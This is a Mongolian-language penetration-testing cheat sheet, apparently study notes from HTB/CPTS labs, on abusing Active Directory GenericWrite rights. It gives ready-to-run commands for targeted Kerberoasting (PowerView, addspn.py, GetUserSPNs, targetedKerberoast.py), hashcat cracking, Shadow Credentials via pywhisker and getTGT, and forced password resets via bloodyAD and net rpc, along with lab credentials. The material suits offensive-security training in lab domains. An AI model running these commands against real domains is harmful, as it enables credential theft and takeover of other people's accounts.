# Administrator - GenericWrite user to user

### CPTS genericAll

**GenericWrite** эрх ашиглан SPN-гүй энгийн хэрэглэгчид хүчээр SPN оноож, Kerberoastable болгон хувиргах замаар нууц үгийг нь сугалан авах халдлагыг Targeted Kerberoasting (ACL Abuse) гэнэ.

[image]

**WINDOWS - Хуурамч SPN ticket-ийг ttimmons хэрэглэгчид оноож өгөх (MS01, DEV01 дээр)**

```powershell
import-module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

[image]

**LINUX - Хуурамч SPN ticket-ийг ttimmons хэрэглэгчид оноож өгөх (DC01 руу)**

```bash
python3 addspn.py -u 'INLANEFREIGHT\mssqladm' -p 'DBAilfreight1!' -t 'ttimmons' -s 'acmetesting/LEGIT' -dc-ip 172.16.8.3 172.16.8.3
```

**SPN-тэй болсон учир TGS тасалбарыг (hash) сугалж аваад Hashcat-аар нууц үгийг олно.**

```bash
impacket-GetUserSPNs -request -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

[image]

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## TargetedKerberoast

Зорилтот хэрэглэгч рүү GenericWrite эрхээр kerberoast халдлага хийх боломжтой. targetedKerberoast.py.

`emily` хэрэглэгчид **Administrator** объект дээр **GenericWrite** эрх байна. Энэ нь тухайн объектын attribute-ыг өөрчлөх боломжийг олгодог.

[image]

```bash
./targetedKerberoast.py --dc-ip 10.10.11.42 -v -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

[image]

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Shadow Credentials (Хамгийн цэвэрхэн арга)

Энэ аргаар нууц үгийг солихгүйгээр Ticket (TGT) авч чадна. `msDS-KeyCredentialLink` атрибутыг өөрчилж, объект дээр өөрийн гэрчилгээг (certificate) бүртгүүлнэ.

**Алхам 1 (Гэрчилгээ нэмэх):**

```bash
python3 pywhisker.py -d "secura.yzx" -u "alice" -p "password" --target "bob" --action "add"
```

*Үр дүнд `.pfx` файл болон түүний нууц үг гарч ирнэ.*

**Алхам 2 (Ticket авах):**

```bash
impacket-getTGT 'secura.yzx/bob' -cert-pfx "cert.pfx" -pfx-pass "password"
```

## Force Password Change

```bash
bloodyAD -u alice -p 'password' -d secura.yzx --host <DC_IP> set password bob 'NewPassword123!'
```

```bash
net rpc password bob "NewPassword123!" -U "secura.yzx/alice%password" -S <DC_IP>
```
